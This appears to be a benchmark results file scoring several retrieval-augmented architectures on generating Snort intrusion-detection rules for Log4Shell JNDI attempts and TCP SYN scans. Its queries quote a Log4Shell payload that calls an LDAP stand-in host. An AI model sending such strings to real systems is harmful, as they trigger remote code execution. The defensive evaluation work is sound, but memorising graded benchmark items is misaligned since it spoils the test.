query_id,architecture,query,precision_at_3,recall_at_3,recall_at_5,mrr,ndcg_at_5,family_accuracy,type_accuracy,protocol_accuracy,port_accuracy,snort_syntax_valid,rule_token_jaccard,hallucination_flag,expected_doc_id,retrieved_ids,generated_family,expected_family,generated_type,expected_type,generated_rule
Q_001,baseline,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,1.0,SNORT_0100,,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_001,rag_classic,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0100,SNORT_0066;SNORT_0100;SNORT_0032;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000066; rev:1;)"
Q_001,rag_rerank,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0100,SNORT_0066;SNORT_0100;SNORT_0032;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000066; rev:1;)"
Q_001,rag_hybrid,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0100,SNORT_0066;SNORT_0100;SNORT_0032;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000066; rev:1;)"
Q_001,multi_hop,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0100,SNORT_0066;SNORT_0100;SNORT_0032;SNORT_0151;SNORT_0083,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000066; rev:1;)"
Q_001,graph_rag,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0100,SNORT_0032;SNORT_0066;SNORT_0049;SNORT_0100;SNORT_0134,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_001,agentic_rag,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0100,SNORT_0066;SNORT_0100;SNORT_0032;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000066; rev:1;)"
Q_002,baseline,How can we detect rule for tcp syn port scan on the network.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,SNORT_0001,,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_002,rag_classic,How can we detect rule for tcp syn port scan on the network.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0001,SNORT_0001;SNORT_0103;SNORT_0035;SNORT_0154;SNORT_0086,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_002,rag_rerank,How can we detect rule for tcp syn port scan on the network.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0001,SNORT_0001;SNORT_0103;SNORT_0035;SNORT_0154;SNORT_0086,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
